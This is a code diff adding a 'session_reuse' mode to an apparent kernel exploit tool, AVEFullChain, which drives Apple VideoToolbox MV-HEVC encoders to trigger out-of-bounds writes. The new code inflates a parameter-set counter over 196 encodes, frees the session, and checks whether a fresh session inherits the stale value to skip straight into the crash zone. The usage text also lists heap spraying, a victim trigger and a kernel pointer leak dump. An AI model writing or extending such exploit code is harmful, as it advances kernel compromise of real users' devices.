@@ -989,6 +989,91 @@ int main(int argc, char *argv[]) {
         VTCompressionSessionInvalidate(s); CFRelease(s);
         if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
 
+    } else if (strcmp(mode, "session_reuse") == 0) {
+        rlog("SESSION_REUSE: Test kalloc_data memory reuse (stale counter attack)\n");
+        rlog("Theory: if freed HEVC buffer memory isn't zeroed, a new session\n");
+        rlog("inherits the old VPS counter value. If counter was 588 (196*3),\n");
+        rlog("new entries start DIRECTLY in the crash zone on first encode.\n\n");
+        rlog("This bypasses the 197-encode safe window entirely.\n\n");
+
+        if (phase1_verify() != 0) goto done;
+
+        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xDEAD;
+        int sr_rounds = (argc > 3) ? atoi(argv[3]) : 5;
+        rlog("Session A layer_id=0x%x, %d reuse rounds\n\n", sr_lid, sr_rounds);
+
+        /* Session A: encode 196 times (safe max) to inflate counter to ~588 */
+        rlog("--- Session A: 196 encodes (counter inflation) ---\n");
+        VTCompressionSessionRef sa = create_mvhevc_encoder(128, 128, sr_lid);
+        if (!sa) { rlog("FAILED: Session A encoder creation\n"); goto done; }
+
+        for (int i = 0; i < 196; i++) {
+            int st = encode_one(sa, i, 128, 128);
+            if (st != 0) { rlog("[A:%d] ENCODE ERROR: %d\n", i, st); break; }
+            if ((i+1) % 50 == 0) rlog("[A:%d] ok, ~%d entries\n", i+1, (i+1)*3);
+        }
+        VTCompressionSessionCompleteFrames(sa, kCMTimeInvalid);
+        usleep(200000);
+
+        /* Record Session A's final pset state */
+        size_t sa_psets = g_last_pset_count;
+        size_t sa_bytes = g_last_pset_total_bytes;
+        rlog("Session A final: pset_count=%zu, pset_bytes=%zu\n", sa_psets, sa_bytes);
+
+        /* Free Session A — HEVC buffer goes back to kalloc */
+        rlog("\nFreeing Session A (HEVC buffer returns to kalloc_data)...\n");
+        VTCompressionSessionInvalidate(sa); CFRelease(sa);
+        usleep(100000);
+
+        /* Session B: allocate new encoder — may reuse same memory */
+        for (int round = 0; round < sr_rounds; round++) {
+            rlog("\n--- Session B (round %d/%d): testing for stale counter ---\n",
+                 round+1, sr_rounds);
+            VTCompressionSessionRef sb = create_mvhevc_encoder(128, 128, sr_lid);
+            if (!sb) { rlog("FAILED: Session B encoder creation\n"); continue; }
+
+            /* Encode just 1 frame and observe pset behavior */
+            rlog("  Encoding 1 frame...\n");
+            g_last_pset_count = 0;
+            g_last_pset_total_bytes = 0;
+            int st = encode_one(sb, 0, 128, 128);
+            rlog("  Result: status=%d, pset_count=%zu, pset_bytes=%zu\n",
+                 st, g_last_pset_count, g_last_pset_total_bytes);
+
+            /* Compare with expected fresh-session values:
+             * Fresh: pset_count=3 (VPS+SPS+PPS), small byte count
+             * Stale counter: pset_count >> 3 (counter starts high, reads OOB entries)
+             * Or: session creation crash (stale data causes fault) */
+            if (g_last_pset_count > 10) {
+                rlog("  *** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
+                     g_last_pset_count);
+                rlog("  *** Session B counter started at stale value from Session A ***\n");
+                rlog("  *** Memory NOT zeroed by kalloc_data! ***\n");
+            } else if (g_last_pset_count <= 3 && st == 0) {
+                rlog("  Normal: pset_count=%zu (fresh counter, memory likely zeroed)\n",
+                     g_last_pset_count);
+            }
+
+            /* Encode 5 more frames to observe counter growth */
+            rlog("  Encoding 5 more frames to observe counter...\n");
+            for (int i = 1; i <= 5; i++) {
+                st = encode_one(sb, i, 128, 128);
+                rlog("    [B:%d] status=%d psets=%zu bytes=%zu\n",
+                     i, st, g_last_pset_count, g_last_pset_total_bytes);
+                if (st != 0) break;
+            }
+            VTCompressionSessionCompleteFrames(sb, kCMTimeInvalid);
+            usleep(100000);
+
+            /* Free session B for next round */
+            VTCompressionSessionInvalidate(sb); CFRelease(sb);
+            usleep(100000);
+        }
+
+        rlog("\nSession reuse test complete.\n");
+        rlog("If stale counter detected: skip crash_test, exploit directly.\n");
+        rlog("If memory zeroed: session reuse trick not viable.\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -1008,6 +1093,7 @@ int main(int argc, char *argv[]) {
         rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
         rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
         rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
+        rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
         rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
